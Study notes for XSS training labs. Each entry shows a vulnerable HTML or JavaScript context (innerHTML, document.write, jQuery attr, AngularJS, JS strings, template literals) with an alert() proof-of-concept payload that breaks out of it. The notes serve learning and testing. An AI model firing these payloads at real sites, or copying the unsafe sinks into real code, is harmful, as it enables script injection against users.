# XSS

## XSS between HTML tags

### Reflected XSS into HTML context with nothing encoded
Search for: `<script>alert(1)</script>`

### Stored XSS into HTML context with nothing encoded
Post new comment: `<script>alert(1)</script>`

## XSS in HTML tag attributes

### Reflected XSS into attribute with angle brackets HTML-encoded
Context:
```html
<input maxlength="600" type="text" placeholder="Search the blog..." name="search" value="{HERE}">
```

Exploit:
```
" onfocus=alert(1) autofocus x="
```

### Stored XSS into anchor href attribute with double quotes HTML-encoded
Context:
```html
<a id="author" href="{HERE}">My web</a>
```

Exploit:
```
javascript:alert(1)
```

## DOM-based XSS

### DOM XSS in document.write sink using source location.search
Context:
```js
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
```

Exploit:
```
" onload="alert(1)"
```

### DOM XSS in document.write sink using source location.search inside a select element
Context:
```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
...
document.write('</select>');
```

Exploit:
```
storeId=</option></select><script>alert(1)</script>
```

### DOM XSS in innerHTML sink using source location.search
Context:
```js
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```
Exploit:
```
<img src=0 onerror="alert(1)">
```

### DOM XSS in jQuery anchor href attribute sink using location.search source
Context:
```js
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```
Exploit:
```
returnPath=javascript:alert(1)
```

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
Context:
```html
<h1 ng-app="" class="ng-scope">0 search results for '{HERE}'</h1>
```
Exploit:
```
{{$on.constructor('alert(1)')()}}
```

## XSS into JavaScript

### Reflected XSS into a JavaScript string with single quote and backslash escaped
Context:
```js
var searchTerms = '{HERE}';
```
Exploit:
```
</script><script>alert(1)</script>
```

### Reflected XSS into a JavaScript string with angle brackets HTML encoded
Context:
```js
var searchTerms = '{HERE}';
```
Exploit:
```
';alert(1);//
```

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
Context:
```js
var searchTerms = '{HERE}';
```
Exploit:
```
\';alert(1);// 
```
Trick is that the \ is also escaped!

### Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
Context:
```html
<a id="author" href="http://www.foo.bar" onclick="var tracker={track(){}};tracker.track({HERE}');">Web</a>
```
Exploit:
```
http://foo.bar&apos;)alert(1);//
```

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
Context:
```js
var message = `0 search results for '{HERE}'`;
```
Exploit:
```
${alert(document.domain)}
```